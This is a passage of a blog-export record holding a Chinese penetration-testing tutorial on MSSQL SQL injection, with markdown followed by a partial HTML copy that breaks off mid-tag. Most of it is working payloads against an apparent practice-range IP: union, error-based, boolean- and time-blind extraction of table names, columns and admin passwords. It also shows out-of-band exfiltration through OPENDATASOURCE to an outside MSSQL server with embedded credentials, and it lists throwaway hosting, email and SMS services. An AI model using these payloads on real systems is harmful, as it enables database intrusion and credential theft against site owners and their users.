sysobjects)>0\n```\n\n![](https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png)\n还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY '00:00:10'; -- asd\n```\n\n![](https://p4.ssl.qhimg.com/t0196919ac7c368e603.png)\n\n## 3、相关概念\n\n### 系统自带库\n\nMSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。\n这里了解一下系统级库：\n```\nmaster：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。\nmodel：模版数据库\ntempdb：临时容器\nmsdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。\n```\n### 系统自带表\n\nMSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。\n```\nsysobjects：记录了数据库中所有表，常用字段为id、name和xtype。\nsyscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。\n```\n就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个'U'为用户所创建，一个'S'为系统所创建。其他对象类型如下：\n```php\n对象类型：\nAF = 聚合函数 (CLR)\nC = CHECK 约束\nD = DEFAULT（约束或独立）\nF = FOREIGN KEY 约束\nFN = SQL 标量函数\nFS = 程序集 (CLR) 标量函数\nFT = 程序集 (CLR) 表值函数\nIF = SQL 内联表值函数\nIT = 内部表\nP = SQL 存储过程\nPC = 程序集 (CLR) 存储过程\nPG = 计划指南\nPK = PRIMARY KEY 约束\nR = 规则（旧式，独立）\nRF = 复制筛选过程\nS = 系统基表\nSN = 同义词\nSQ = 服务队列\nTA = 程序集 (CLR) DML 触发器\nTF = SQL 表值函数\nTR = SQL DML 触发器\nU = 表（用户定义类型）\nUQ = UNIQUE 约束\nV = 视图\nX = 扩展存储过程\n```\n\n### 排序&获取下一条数据\n\nmssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用<>或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上('')，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：\n\n```php\n#使用<>获取数据\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name<>'id' and name<>'username'-- qwe\n#使用not in获取数据\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe\n```\n\n![](https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png)\n\n### 堆叠注入\n\n在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。\n\n```php\nhttp://192.168.150.4:9001/less-1.asp?id=1';WAITFOR DELAY '0:0:5';-- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0181df866952842a55.png)\n\n# 0x03 显错注入\n\n## 1、判断当前字段数\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 order by 4\n```\n\n![](https://p5.ssl.qhimg.com/t0163e343ea44015455.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=2 order by 5\n```\n\n![](https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png)\n通过order by报错情况，可以判断出当前字段为4。\n\n## 2、联合查询，获取显错点\n\n1、首先因为不知道具体类型，所以还是先用null来填充字符\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe\n```\n![](https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png)\n2、替换null为'null'，获取显错点\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'null','null',null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png)\n当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select 'null','null','null',null -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0100837f900c3ef729.png)\n\n## 3、通过显错点获取数据库信息\n\n1、获取数据库版本\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select @@version),null -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t012f189779bf95f529.png)\n2、查询当前数据库名称\n通过轮询db_name(*)里*的内容，获取所有数据库库名\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select db_name(5)),null -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png)\n![](https://p4.ssl.qhimg.com/t01409617b57bcdb809.png)\n3、查询当前用户\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select user),null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01e868a65736530e91.png)\n\n\n## 4、查询表名\n\n查询dbo.sysobjects表中用户创建的表，获取其对应的id和name\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype='U' -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t0125721234db891a35.png)\n查询下一个表名\n\n```php\n#使用<>获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id <> 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype='U' and id not in ('5575058') -- qwe\n```\n\n![](https://p4.ssl.qhimg.com/t011661598555b1c380.png)\n\n## 5、查询列名\n\n这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058'-- qwe\n```\n\n![](https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id='5575058' and name not in ('id','username')-- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01a8944599c209006a.png)\n\n## 6、information_schema\n\n值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 table_name from information_schema.tables where table_name <> 'manager'),null -- qwe\n```\n\n![](https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png)\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,'1',(select top 1 column_name from information_schema.columns where table_name = 'manage' and column_name not in ('id','username')),null -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png)\n![](https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png)\n\n\n## 7、获取数据\n\n```php\nhttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username <> 'admin_mz'-- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png)\n解密获取密码\n![](https://p2.ssl.qhimg.com/t016cb243729a0f493a.png)\n\n# 0x04 报错注入\n\nmssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。\n\n## 1、直接报错\n\n等号两边数据类型不一致配合子查询获取数据。\n\n```php\n#获取数据库库名?id=1' and 1=(select db_name()) -- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png)\n\n```php\n#获取第一个表名?id=1' and 1=(select top 1 name from dbo.sysobjects) -- qwe\n```\n\n![](https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png)\n\n```php\n#将数据连接显示?id=1'  and 1=stuff((select db_name() for xml path('')),1,0,'')--+\n```\n\n## 2、convert()函数\n\n```php\nconvert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。\n```\n\n具体用法如下：\n\n```php\n#获取数据库库名?id=1' and 1=convert(int,(select db_name())) -- qwe\n```\n\n![](https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png)\n\n```php\n#获取数据库版本?id=1' and 1=convert(int,(select @@version))) -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png)\n\n## 3、cast()函数\n\n```php\nCAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。\n```\n\n具体用法如下：\n\n```php\n#查询当前数据库?id=1' and 1=(select cast(db_name() as int)) -- qe\n```\n\n![](https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png)\n\n```php\n#查询第一个数据表?id=1' and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe\n```\n\n![](https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png)\n\n## 4、数据组合输出\n\n```php\n#将数据表组合输出?id=1' and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path('')),1,0,'')--+\n```\n\n![](https://p0.ssl.qhimg.com/t0126a37aad232cde94.png)\n\n```php\n#查询users表中的用户名并组合输出?id=1'  and 1=stuff((select quotename(username) from users for xml path('')),1,0,'')--+\n```\n\n![](https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png)\n\n# 0x05 布尔盲注\n\n## 1、查询数据库库名\n\n1、查询数据库库名长度为11\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11\n```\n\n![](https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png)\n2、查询第一个字符的ascii码为109\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))>109\n```\n\n![](https://p5.ssl.qhimg.com/t0116e04363840e9a62.png)\n![](https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png)\n3、查询第二个字符的ascii码为111\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111\n```\n\n![](https://p5.ssl.qhimg.com/t01e337930ebb104e75.png)\n4、获取所有ascii码之后，解码获取数据\n![](https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png)\n\n## 2、查询表名\n\n除了像上面查询库名使用了ascii码外，还可以直接猜解字符串\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m'\n```\n\n![](https://p1.ssl.qhimg.com/t019bb4ff316062345b.png)\n\n```php\nhttp://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype='U'),1,6)='manage'\n```\n\n![](https://p5.ssl.qhimg.com/t017026272920723c8d.png)\n\n# 0x06 延时盲注\n\n## 1、延时函数 WAITFOR DELAY\n\n```php\n语法：n表示延时几秒WAITFOR DELAY '0:0:n'id=1 if (布尔盲注的判断语句) WAITFOR DELAY '0:0:5' -- qwe\n```\n\n## 2、查询数据\n\n```php\n#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY '0:0:5' -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t018900c2d899e6edae.png)\n\n```php\n#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype='U'),1,1)='m') WAITFOR DELAY '0:0:5' -- qwe\n```\n\n![](https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png)\n\n\n# 0x07 反弹注入\n\n就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。\n反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。\n反弹注入需要使用opendatasource函数。\n\n```php\nOPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。\n```\n\n```php\n申请免费云服务器：香港云：http://www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/\n```\n\n## 1、环境准备\n\n1、首先打开靶场\n![](https://p3.ssl.qhimg.com/t0125c9c6371197c223.png)\n3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。\n\n```php\nCREATE TABLE test(name VARCHAR(255))\n```\n\n![](https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png)\n\n## 2、获取数据库所有表\n\n1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。\n\n```php\n#查询sysobjects表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype='U' -- qwe#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe\n```\n\n2、执行成功页面返回正常。\n![](https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png)\n3、在数据库中成功获取到数据。\n![](https://p2.ssl.qhimg.com/t014a5c058780e87669.png)\n\n## 3、获取数据库admin表中的所有列名\n\n```php\n#查询information_schema数据库?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name='admin'-- qwe#查询syscolumns表?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png)\n![](https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png)\n\n## 4、获取数据\n\n1、首先新建一个表，里面放三个字段，分别是id，username和passwd。\n\n```php\nCREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255))\n```\n\n2、获取admin表中的数据\n\n```php\n?id=1';insert into opendatasource('sqloledb','server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test').DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe\n```\n\n![](https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png)\n![](https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png)\n\n# 0x08 总结\n\n\t完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。\n\t\n\t靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～\n","slug":"MSSQL数据库注入全方位利用","published":1,"updated":"2021-08-26T03:34:50.156Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgi0054vkq30rne3kk2","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文由ajie原创发布<br>转载，请参考转载声明，注明出处： <a href=\"https://www.anquanke.com/post/id/248896\">https://www.anquanke.com/post/id/248896</a><br>安全客 - 有思想的安全新媒体</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～</p>\n<h1 id=\"0x02-注入前准备\"><a href=\"#0x02-注入前准备\" class=\"headerlink\" title=\"0x02 注入前准备\"></a>0x02 注入前准备</h1><h2 id=\"1、确定注入点\"><a href=\"#1、确定注入点\" class=\"headerlink\" title=\"1、确定注入点\"></a>1、确定注入点</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and 1=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and 1=2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png\"></p>\n<h2 id=\"2、判断是否为mssql数据库\"><a href=\"#2、判断是否为mssql数据库\" class=\"headerlink\" title=\"2、判断是否为mssql数据库\"></a>2、判断是否为mssql数据库</h2><p>sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)&gt;0</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png\"><br>还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY &#x27;00:00:10&#x27;; -- asd</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t0196919ac7c368e603.png\"></p>\n<h2 id=\"3、相关概念\"><a href=\"#3、相关概念\" class=\"headerlink\" title=\"3、相关概念\"></a>3、相关概念</h2><h3 id=\"系统自带库\"><a href=\"#系统自带库\" class=\"headerlink\" title=\"系统自带库\"></a>系统自带库</h3><p>MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。<br>这里了解一下系统级库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。</span><br><span class=\"line\">model：模版数据库</span><br><span class=\"line\">tempdb：临时容器</span><br><span class=\"line\">msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。</span><br></pre></td></tr></table></figure>\n<h3 id=\"系统自带表\"><a href=\"#系统自带表\" class=\"headerlink\" title=\"系统自带表\"></a>系统自带表</h3><p>MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。</span><br><span class=\"line\">syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。</span><br></pre></td></tr></table></figure>\n<p>就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个’U’为用户所创建，一个’S’为系统所创建。其他对象类型如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对象类型：</span><br><span class=\"line\">AF = 聚合函数 (CLR)</span><br><span class=\"line\">C = CHECK 约束</span><br><span class=\"line\">D = <span class=\"keyword\">DEFAULT</span>（约束或独立）</span><br><span class=\"line\">F = FOREIGN KEY 约束</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">FN</span> = <span class=\"title\">SQL</span> 标量函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">FS</span> = 程序集 (<span class=\"params\">CLR</span>) 标量函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">FT</span> = 程序集 (<span class=\"params\">CLR</span>) 表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">IF</span> = <span class=\"title\">SQL</span> 内联表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">IT</span> = 内部表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">P</span> = <span class=\"title\">SQL</span> 存储过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PC</span> = 程序集 (<span class=\"params\">CLR</span>) 存储过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PG</span> = 计划指南</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PK</span> = <span class=\"title\">PRIMARY</span> <span class=\"title\">KEY</span> 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">R</span> = 规则（旧式，独立）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">RF</span> = 复制筛选过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">S</span> = 系统基表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">SN</span> = 同义词</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">SQ</span> = 服务队列</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TA</span> = 程序集 (<span class=\"params\">CLR</span>) <span class=\"title\">DML</span> 触发器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TF</span> = <span class=\"title\">SQL</span> 表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TR</span> = <span class=\"title\">SQL</span> <span class=\"title\">DML</span> 触发器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">U</span> = 表（用户定义类型）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">UQ</span> = <span class=\"title\">UNIQUE</span> 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">V</span> = 视图</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">X</span> = 扩展存储过程</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"排序-amp-获取下一条数据\"><a href=\"#排序-amp-获取下一条数据\" class=\"headerlink\" title=\"排序&amp;获取下一条数据\"></a>排序&amp;获取下一条数据</h3><p>mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用&lt;&gt;或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用&lt;&gt;获取数据</span></span><br><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name&lt;&gt;&#x27;id&#x27; and name&lt;&gt;&#x27;username&#x27;-- qwe</span></span><br><span class=\"line\"><span class=\"comment\">#使用not in获取数据</span></span><br><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png\"></p>\n<h3 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h3><p>在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.150.4:9001/less-1.asp?id=1&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0181df866952842a55.png\"></p>\n<h1 id=\"0x03-显错注入\"><a href=\"#0x03-显错注入\" class=\"headerlink\" title=\"0x03 显错注入\"></a>0x03 显错注入</h1><h2 id=\"1、判断当前字段数\"><a href=\"#1、判断当前字段数\" class=\"headerlink\" title=\"1、判断当前字段数\"></a>1、判断当前字段数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 order by 4</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0163e343ea44015455.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 order by 5</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png\"><br>通过order by报错情况，可以判断出当前字段为4。</p>\n<h2 id=\"2、联合查询，获取显错点\"><a href=\"#2、联合查询，获取显错点\" class=\"headerlink\" title=\"2、联合查询，获取显错点\"></a>2、联合查询，获取显错点</h2><p>1、首先因为不知道具体类型，所以还是先用null来填充字符</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png\"><br>2、替换null为’null’，获取显错点</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png\"><br>当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select &#x27;null&#x27;,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0100837f900c3ef729.png\"></p>\n<h2 